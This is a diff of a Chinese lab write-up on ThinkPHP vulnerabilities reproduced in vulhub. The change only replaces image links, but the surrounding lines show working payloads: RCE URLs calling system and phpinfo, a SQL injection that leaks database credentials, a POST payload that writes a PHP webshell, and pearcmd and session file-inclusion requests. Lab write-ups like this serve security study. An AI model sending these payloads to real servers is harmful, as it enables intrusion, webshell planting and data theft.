@@ -77,7 +77,7 @@ docker compose up -d
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ3gQoJtare29b3tTicHUwy0cTZWw8YYDsXDqxfD6YntNDBla4xbK0PkQ/640?wx_fmt=png)
+![](../../.resource/remote/af24e775384d7424b2dddfd2a1e2085f059c56c00c38b031896e35ebcbe3824e.png)
 
 环境启动后，访问`http://your-ip:8080/Index/Index`即可查看到默认页面。
 
@@ -85,7 +85,7 @@ docker compose up -d
 
 直接访问`http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D`即可执行`phpinfo()`：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZRTRic7qlDBr20bmjFBdia9UIibvIIuJEk6aZUkXOj6W3TP682zrMHMRiaQ/640?wx_fmt=png)
+![](../../.resource/remote/6538d74e23c490981ca5a6a350ba1899b50876d3607fd06e3217a52344278153.png)
 
 TP - 2.x-RCE x Getshell
 -----------------------
@@ -97,30 +97,30 @@ TP - 2.x-RCE x Getshell
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ9hTYhaB93G1IdAknHdfUth0d3fK2CDolPsTHjM4pTyzicklH3YAlGSQ/640?wx_fmt=png)
+![](../../.resource/remote/7639cdfe4843d4eaf35151a730ffb9dd34852b356728fde72a301844e8a658ff.png)
 
 使用蚁剑连接
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZDgyVncRwApR9o4Age9sibukfqhJoibSoiaV3Gw4sr2jqJ0Tw4E464C10Q/640?wx_fmt=png)
+![](../../.resource/remote/327e05c107ba092766fdbd687eb5243286f80facb1145126f2a8a2d5da171e10.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZbPoicjtLy9CemN3x0LdXJbTZdAAESeiavwmpTr8XibKojPNGFQPQf02WA/640?wx_fmt=png)
+![](../../.resource/remote/152ce62530c620419d24dc8ef97e2e383d64a744a62cf3b1372fcdb07a7df895.png)
 
 TP - 5.0.9-SQLi
 ---------------
 
 启动后，访问`http://your-ip/index.php?ids[]=1&ids[]=2`，即可看到用户名被显示了出来，说明环境运行成功。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZTpOnKUqDfLX2JVgXydagX5icicpvoo0ucpicia5ITVDuYB57qRGBsCsmHw/640?wx_fmt=png)
+![](../../.resource/remote/d3ef1630a36e76f4910e41892102f7704ea8be3c818752d08890dea82dceff55.png)
 
 访问`http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，信息成功被爆出：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZwqT96cSbzy2atWS3bPUdL5RSybiaLCAhhvW2uALYiaN752vic1PWADoicA/640?wx_fmt=png)
+![](../../.resource/remote/732a53670f4fe8a237cdb08c7875fad752ecf4a1f9e0a5e62320547bd22eaa9d.png)
 
 找到数据库账号密码，敏感信息泄露。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZHoaRypthYNQGNozVrmouRV4Tia19Kuf5OjqG4PCj7HKibM5ictq2ZxoHA/640?wx_fmt=png)
+![](../../.resource/remote/afdc368192acfc7433ef3b878d0673ca63e1d2bbc82960bc4bbf7401e7fbc4bc.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZCE3urDGG9FLibsCIIsPAERWDpB3gWOdKC0L0P2ePiceAcCus16rpCdRg/640?wx_fmt=png)
+![](../../.resource/remote/bcb9a4481c7493a28f2edb35fcfe62f6314b368d6412060b1e0150f34000a748.png)
 
 TP - 5.0.22/5.1.29-RCE
 ----------------------
@@ -140,18 +140,18 @@ docker compose up -d
 
 环境启动后，访问`http://your-ip:8080`即可看到 ThinkPHP 默认启动页面。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZyia2vwtUvMlFbREqzn1JEicJrL5ORSWrjXN2qBH1ia8iclEVOw4gvOwwkA/640?wx_fmt=png)
+![](../../.resource/remote/2e66d03cf9ce0afc3b9fcf869b5fadeb79c9692e67239740ea21d2e670882a0b.png)
 
 直接访问`http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行 phpinfo
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZjqagAqltSrGlNCWZ7Kiae6nQvFy5zMJIy66q5DYXEMr16VvLic7IV1JQ/640?wx_fmt=png)
+![](../../.resource/remote/4b49a64b3062fc1acf7bfae468e30ea13fcad8ce2849e2f9b03cda75ae2eec39.png)
 
 ```
 http://192.168.66.132:8080/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZtB1LhzTY6qiaQQ3MDLApV1edGIYf7FGHNAGF7Ht8bP5r8ULvq0otSGg/640?wx_fmt=png)
+![](../../.resource/remote/7fc3d9d85f08b593614223c8784f01a274df7d4ce0ecea3ff944f8791828b169.png)
 
 TP - 5.0.22/5.1.29-RCE x Getshell
 ---------------------------------
@@ -161,7 +161,7 @@ http://192.168.66.132:8080/?s=index/\think\app/invokefunction&function=call_user
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZtqfnRlFBv3OUVswnxhibZiaN8oSWN3I0lQImNO2ImqCGP3EYWbVRYZCw/640?wx_fmt=other)
+![](../../.resource/remote/de8bc99c2152bf7094d27254976ea9bd474fbc6365b181eacb308e7732828db3.png)
 
 TP - 5.0.23-RCE
 ---------------
@@ -170,15 +170,15 @@ ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本�
 
 在 vulhub 中开启即可
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZpAic0SZw2127EkJJhhOibmTb0G4FDeIX83Ts8uic9c1LHpvZbZoicyPaWg/640?wx_fmt=png)
+![](../../.resource/remote/7b2d08e9ba7a6a216e771950586390713eebd4dc6ed4530cfdc7848b5e4b672b.png)
 
 页面访问
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZbwlZsoZoVZMPOjp2UIU8k3Gw4kCNgajcPJ5ib0NZ41Cv1KqmCVzu6Sg/640?wx_fmt=png)
+![](../../.resource/remote/b95fe37c6baf6b5bca41ee1c1284e45c8c66a05fefc140dba04f27ac74b7ba9f.png)
 
 抓包更改为 POST
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZsiaxGEDhkM4xllRESwX8bic4q3tPHmIJRKn6oWicic68ZV3ibhibSswJuLhA/640?wx_fmt=png)
+![](../../.resource/remote/fc76866b57583ae9acfdf106370614c34a2a8854b63d80c1db0f7c70ec4ba679.png)
 
 ```
 POST /index.php?s=captcha HTTP/1.1
@@ -195,7 +195,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZyibhpMSuqrISOzM2OYVNHyGGXZjVzDjyKUpjDMzrRz01HfFwicVC8ibLw/640?wx_fmt=png)
+![](../../.resource/remote/14aa4bbf4e83e85536df740fdc1c0e762cda970ed30566c001e3fd77431ad00d.png)
 
 TP - 5.0.23-RCE x Getshell
 --------------------------
@@ -217,19 +217,19 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?ph
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZwHJdaOJpU2cJNBKTiahL0rNceGuicX4ePxSdE6r6SrIS6CT9ZHjYeqJQ/640?wx_fmt=png)
+![](../../.resource/remote/9a0381547da88616fad2f780397a2e430b5754483191cfa8e86567f4d430c093.png)
 
 响应 500，实际上上传成功
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZVtJ2h7Ew6v8jPNaEqtzf9icf2zCd0wYnmY4jb75TQwcqwGc48XZJnIA/640?wx_fmt=png)
+![](../../.resource/remote/af27882b688bcdbbd715e9890098b06b0df06f4c27cf31c5d3a59ba860ca0051.png)
 
 访问浏览器
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZECSLMTNyqw5iaUTkYSBYG90OEBicTnTOs4I7Jt6DAE2p53wvSzMeY6hQ/640?wx_fmt=png)
+![](../../.resource/remote/32d182a1fa20c03848b67c7861a6df99ca063cac1fd965f64aa0f926b3f3bbb8.png)
 
 蚁剑连接
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZWtzBBxA5KJevUT0BlNJ8z2EpEBsrCrRTribzNB0ptHBIsZmLBoiaKAnw/640?wx_fmt=png)
+![](../../.resource/remote/7ab185c9ab57aa526f785d2f9ed2e4507157838bbb76e3d89d46d2897ca20754.png)
 
 TP - 6.0.1 Session 任意文件操作
 -------------------------
@@ -257,9 +257,9 @@ php think run -p 8000
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZLNf3QUKfbzPtF5BicetBCYA5lN5hcAh31QzP1Gxyuz2BK0EckNsPvxA/640?wx_fmt=png)
+![](../../.resource/remote/691e3216b7c20ada250e43d1fa7344ae5e9cfeb2fc7fec8bca087b80820e1014.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ9CwibCkjVtiaWs1On5vZKVY3JVtwvt7WUpOrPzZhnDiceFw4SMZZpC9bQ/640?wx_fmt=png)
+![](../../.resource/remote/b91ba451004c559933be3be6875797baf529f474dddbb1635c56f2f7d4f41d08.png)
 
 更改版本，使用 composer update 即可更新版本, “^6.0.0” 改为 "6.0.1"
 
@@ -296,15 +296,15 @@ class Index extends BaseController
 
 去掉注释 session 的 //
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ6szzcpyE5k2xUUVfTHHjQr4ZWia6Sb43FwVu0YHXNoqXzJf35arb1ZA/640?wx_fmt=png)
+![](../../.resource/remote/43ada9df3606bf7b131f70f18737b61be6fc773f128e4c9324ab1d5c3582f626.png)
 
 > 遇到的一些小问题，kali 下载 php7.4 一直缺少依赖，72,73 都安装成功，但是 composer 必须 7.4 及以上，这就很烦，我干脆干掉它，直接找文件改代码，等于 7.3。没想到成功。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZSvSCia9a4JoHEreTCT95ra0jI5TBrvicUmoD5noEFRtwbNwLIVc9nBVg/640?wx_fmt=png)
+![](../../.resource/remote/fadedef53df6847ade8c4c3e2c47deb35ecdc90ec0b8b4278c87090fa6b0888f.png)
 
 本来是 70400，再次执行 php7.3 think run 就 ok 了
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ3jTYgbk1YGKaiaT6TPmpM21ibSeicmQ9kkE59uqX9FJWT7wOMdNic75EXA/640?wx_fmt=png)
+![](../../.resource/remote/06ed77a2209af1901f7be70d89d9dee0e16de445f9e643a819f8d82062eaa8a2.png)
 
 方法一
 
@@ -323,7 +323,7 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZzes8ZibZP3MEQsibol44ywrTSqJfyT7seBahuxQIpXHu2jPbuhwnAQIw/640?wx_fmt=png)
+![](../../.resource/remote/802788a0fb47c40e8875b8fb5de1c1ced1a5fb618344074f751b3e5a1e5bd9fa.png)
 
 1234567890123456789012345678.php
 
@@ -332,7 +332,7 @@ http://192.168.66.132:8001/runtime/session/sess_1234567890123456789012345678.php
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZibXFs1scfUGax1kf8MTCl6qBKBchFZp8SzicbdiaJ0bmzDQbKPqLf8DXw/640?wx_fmt=png)
+![](../../.resource/remote/317dc37d6403a1239f81ee369c7220806c70f58537bd0fd393b4b03550f7da6a.png)
 
 访问没成功，emmm
 
@@ -353,9 +353,9 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZeHHnT4Qich7RhrLHJgic2N5Y875JEg4x9qdXFoavzHGbpRpkSqUVE06g/640?wx_fmt=png)
+![](../../.resource/remote/065fff223f0720e191e50984f2c0d21fa69ee410a497bf8db870f45caf68ece2.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZHjpFOaHwhXosYHiaSNDmlptrIPA3VNwhSpR1wbVXgiaibJvXP0fjiaVYpw/640?wx_fmt=png)
+![](../../.resource/remote/7c8acbef2f213af6b82a5b5c9d8067d678df68577beef19712547f445349012a.png)
 
 TP - 6.0.13-Pearcmd x EXP
 -------------------------
@@ -380,7 +380,7 @@ Connection: close
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZDE6HEfiaEnPvRJXTKDCqHt9PvpQkMtPClic0TxlSzS4hRCeCRXLhfomw/640?wx_fmt=png)
+![](../../.resource/remote/ecec30fe510bea516e9c818fa37f1236fc64143b87c5d3b89dab10af8e92db38.png)
 
 查看
 
@@ -389,7 +389,7 @@ docker exec -it 20c58ef53381 /bin/bash
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZfNHsxMKGsouaYLx9A6gIVOdgfAbe2mU7xBmhMAraocVRfLpzKuXl1Q/640?wx_fmt=png)
+![](../../.resource/remote/0fe535db507f6f361e357bcb9d83f6f8651c53a74266ff829a144c0ca62e0a43.png)
 
 包含 hello.php
 
@@ -409,7 +409,7 @@ Connection: close
 
 浏览器访问
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZjx0j9DaxPV1FpuBsoNVbwvg2pOfuHaM1C3icTrqWyyvlPB2z3ggic84w/640?wx_fmt=png)
+![](../../.resource/remote/18b918ac17f4e92fb2d6929295bb890b1e174d368959a0ce4a7251a3be90d257.png)
 
 TP - 6.0.13-Pearcmd x GET
 -------------------------
@@ -429,11 +429,11 @@ Connection: close
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZQ2aEkcPo3DTJzEqUJTY3gnzD66rVOaiatDngn8wibVQuo0v0zw9omljw/640?wx_fmt=png)
+![](../../.resource/remote/1d62b87902912a45d9c61b8fa75c4f054fd97a08e2d8638752c3f2e091fb187d.png)
 
 查看是否成功
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ2OF5ialAH8VPOt0IvFVCiacGibWU1U3sr9zfTqXoTLVaNIG92uju7rYtg/640?wx_fmt=png)
+![](../../.resource/remote/2df283a5c87edd58b6f0c165139d598030569d74510741bfa9fb4065a33d3638.png)
 
 文件包含读取
 
@@ -450,9 +450,9 @@ Connection: close
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ2EsdMEFLjUAKKUMXvY1m649Q1uUwNNqiakeQM1ZLTLd1kibkf1SQx71w/640?wx_fmt=png)
+![](../../.resource/remote/89bcf8ac244717895a5c14f7fa994393e2a92cfee3336e3fa6150964f125253b.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZCCsUgNOsIUib4ovibpuP9ibO1SV5hQObIAiag28kYIIzTGNiamWucSdOAbw/640?wx_fmt=png)
+![](../../.resource/remote/713b739df7da594f4861da490f7787794d69ed962fc84b137bccdb94a8c8273f.png)
 
 TP - 6.0.13-Pearcmd x HEADER
 ----------------------------
@@ -470,11 +470,11 @@ Connection: close
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZhvCYQxDbjkjWrNzyLqJaygibtpyL3icYj8XQhzicgQIPqrJngct4fialsQ/640?wx_fmt=png)
+![](../../.resource/remote/898ae40532712c6e9ffdd706b67840dc9a4da39ca3506d5047a892803ed48e8f.png)
 
 查看
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZIM0DbOkicYz65J2zbMhatwOQFw2ia10Uh5Lb4KlDXIEnDGLH79NTTRSQ/640?wx_fmt=png)
+![](../../.resource/remote/d40bfb98d27f85d417b8efa7dd6d15282f7e8b8c4632234eec33c9e1ec5eb6bd.png)
 
 文件包含查看
 
@@ -491,7 +491,7 @@ Connection: close
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ9Z2tsLhLMiaTicQCDgzHNDayA9dicsibvmJ2Lsx2au5TyngzthHvrQMoNA/640?wx_fmt=png)
+![](../../.resource/remote/1edbb981b791933a9ddd8067532492ed324a2d3b6f78d79ecc888d0ec89f30a0.png)
 
 TP - 6.0.13-Pearcmd x COOKIES
 -----------------------------
@@ -509,11 +509,11 @@ Connection: close
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZP5FMqbHPia8DYzeyqLBPRNp1Pu4lnEGTsef29fxfnibWenVL39icCGkyw/640?wx_fmt=png)
+![](../../.resource/remote/c6324e7286e057b132fb156c48da77bfabaa0f6ec04439b9c19d51a83cd827cf.png)
 
 查看是否成功
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ7LZHMHh1ZTZmKwIzybNCsbAtns3uGs3Kc17jFsflhIK1RDc8SojPBg/640?wx_fmt=png)
+![](../../.resource/remote/853fbb90833680b9a796e33599d95ead3ad456d4252bd8b592d039c85b7efc22.png)
 
 文件包含查看
 
@@ -531,7 +531,7 @@ Connection: close
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZuJia12HWYynmlaQNu3FrbSDmqLvCoCRd2vtQRBYCcU242uGT3vMUTxQ/640?wx_fmt=png)
+![](../../.resource/remote/45c79e6108fdcb1c03b12ef103cab6050aa789fad59ebff3a95524739d40e2e6.png)
 
 TP - 6.0.13-Pearcmd x Getshell
 ------------------------------
@@ -549,7 +549,7 @@ Connection: close
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZiczxib4rJAueA1icKnGKXnrp87ooYhedakfzqMvgTI6zJ96KStzBB4agg/640?wx_fmt=png)
+![](../../.resource/remote/d351b77610501246d27b2df42842a463ddc2222dd648f7f8eb90f2ba297cb715.png)
 
 文件包含访问
 
@@ -569,11 +569,11 @@ Connection: close
 
 页面访问
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZSUWQHub2lmmYcLN4VyZMR7gicFK20ZVKrjYk8pIn2MjG2Wc7R1C1VlQ/640?wx_fmt=png)
+![](../../.resource/remote/03a3c72c31579faa27e4e49b43fee1541dce3d6ce3dc7300de5748623ea9a8c0.png)
 
 使用蚁剑连接
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ1D8VxEg3DicCibf91ERCO0RWyOjxJZq410tqrKFZGaHnuNvUVekFtSsQ/640?wx_fmt=png)
+![](../../.resource/remote/77d8cc8ad61b883e6693eb47331de1f8da6b26bad113f03bea92f09a2d008ab8.png)
 
 ---
 
